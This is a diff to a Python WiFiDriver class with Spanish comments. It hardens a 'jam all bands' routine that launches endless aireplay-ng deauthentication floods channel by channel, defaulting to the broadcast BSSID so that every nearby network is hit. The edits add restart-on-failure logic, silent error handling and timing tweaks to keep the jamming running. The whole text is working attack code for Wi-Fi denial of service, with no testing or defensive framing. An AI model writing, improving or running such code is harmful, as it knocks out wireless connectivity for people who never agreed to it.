@@ -919,11 +919,23 @@ class WiFiDriver:
                         time.sleep(0.5)
                     continue
                 
-                time.sleep(0.1)  # Pequeña pausa después de cambiar canal
+                time.sleep(0.2)  # Pausa después de cambiar canal
                 
                 # Iniciar deauth infinito en este canal
                 cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
                 process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                
+                # Verificar que el proceso inició correctamente
+                time.sleep(0.3)
+                if process.poll() is not None:
+                    # Proceso terminó inmediatamente, leer error
+                    stderr = process.stderr.read().decode('utf-8', errors='ignore') if process.stderr else ""
+                    if stderr and "not found" not in stderr.lower():
+                        # Solo mostrar errores importantes (no "interface not found" que es común)
+                        pass
+                    # Reintentar después de un tiempo
+                    time.sleep(1)
+                    continue
                 
                 # Guardar proceso para poder terminarlo después
                 if not hasattr(self, 'jam_processes'):
@@ -933,11 +945,14 @@ class WiFiDriver:
                 # Mantener el proceso corriendo mientras el jamming esté activo
                 # Verificar periódicamente si debemos continuar
                 while getattr(self, 'jam_all_bands_active', False):
-                    time.sleep(0.5)
+                    time.sleep(1)  # Verificar cada segundo
                     # Verificar si el proceso sigue corriendo
                     if process.poll() is not None:
-                        # Proceso terminó, reiniciar
-                        break
+                        # Proceso terminó, leer error y reiniciar
+                        stderr = process.stderr.read().decode('utf-8', errors='ignore') if process.stderr else ""
+                        if stderr:
+                            # El proceso falló, reiniciar
+                            break
                 
                 # Terminar proceso cuando salimos del loop
                 try:
@@ -955,7 +970,7 @@ class WiFiDriver:
                     self.jam_processes.remove(process)
                 
                 # Pequeña pausa antes de reiniciar
-                time.sleep(0.2)
+                time.sleep(0.3)
                 
             except Exception as e:
                 # Si hay error, esperar un poco antes de reintentar
